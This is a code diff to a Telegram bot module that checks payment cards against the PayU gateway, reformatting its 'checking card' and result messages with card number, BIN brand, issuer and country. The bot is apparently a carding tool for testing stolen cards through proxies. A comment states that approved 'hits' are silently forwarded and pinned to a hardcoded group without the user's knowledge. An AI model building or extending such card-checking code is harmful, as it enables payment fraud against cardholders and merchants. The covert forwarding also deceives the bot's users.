@@ -33,7 +33,7 @@ def _norm_proxy(proxy):
     except Exception:
         pass
     return proxy
-from mass_gates._tg_helpers import safe_reply, send_hit
+from mass_gates._tg_helpers import safe_reply, send_hit, build_hit_card, EMOJI_RESPONSE, APPROVED_EMOJI as PX_LIVE, DECLINED_EMOJI as PX_DEAD
 
 # silent group log for PayU hits (charged/approved -> this group + pinned)
 PAYU_GROUP_ID = -1004453592223
@@ -191,8 +191,9 @@ async def pu_command(message: types.Message):
     plan_name = await get_user_plan_name(user_id)
     escaped_card = escape(formatted_cc)
     proc_msg = await safe_reply(message,
-        f"<pre>{EMOJI_PICKAXE} 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗮𝗿𝗱...</pre>\n"
-        f"<b>𝗖𝗮𝗿𝗱 ➠</b> <code>{escaped_card}</code>",
+        f"<blockquote>{EMOJI_PICKAXE} Ꮪꮖꮇꮐꮮꭼ ꏳꮋꭼꮯꮗ <tg-emoji emoji-id=\"{EMOJI_DIAMOND}\">💎</tg-emoji></blockquote>\n"
+        f"{EMOJI_COMPASS} 𝐂𝐚𝐫𝐝 ➠ <code>{escaped_card}</code>\n"
+        f"{EMOJI_DIAMOND} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ <b>𝐏𝐚𝐲𝐔</b>",
         parse_mode="HTML")
 
     asyncio.create_task(process_pu_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name, amount))
@@ -276,17 +277,11 @@ async def process_pu_check(message, proc_msg, user, user_id, formatted_cc, cc, p
     dev_link = '<a href="https://t.me/Enchanted_linux_0x">Enchanted_linux_0x</a>'
     user_display = f"{user_link} <b>[{plan_name}]</b>"
 
-    final_caption = (
-        f"𝗦𝘁𝗮𝘁𝘂𝘀 ➠ {final_status}\n"
-        f"𝗖𝗮𝗿𝗱 ➠ <code>{formatted_cc}</code>\n"
-        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➠ 𝗣𝗮𝘆𝗨 ${amt}\n"
-        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➠ <b>{escape(str(res_code))}</b>\n"
-        f"𝗥𝗲𝗮𝗹 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➠ <b>{escape(str(real_resp))}</b>\n"
-        f"𝗕𝗿𝗮𝗻𝗱 ➠ <b>{bin_scheme}</b>\n"
-        f"𝗜𝘀𝘀𝘂𝗲𝗿 ➠ <b>{bin_bank}</b>\n"
-        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➠ <b>{bin_country}</b>\n"
-        f"𝗨𝘀𝗲𝗿 ➠ {user_display}\n"
-        f"𝗗𝗲𝘃 ➠ {dev_link}"
+    px = PX_LIVE if status_raw != "error" else PX_DEAD
+    final_caption = build_hit_card(
+        status_raw.upper(), formatted_cc, "𝐏𝐚𝐲𝐔", amt, bin_info, res_code,
+        user_display, dev_link, proxy_status=px,
+        extra_lines=[f"{EMOJI_RESPONSE} 𝐑𝐞𝐚𝐥 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ <b>{escape(str(real_resp))}</b>"],
     )
 
     # silent group log + pin (user is never told their hit was forwarded)
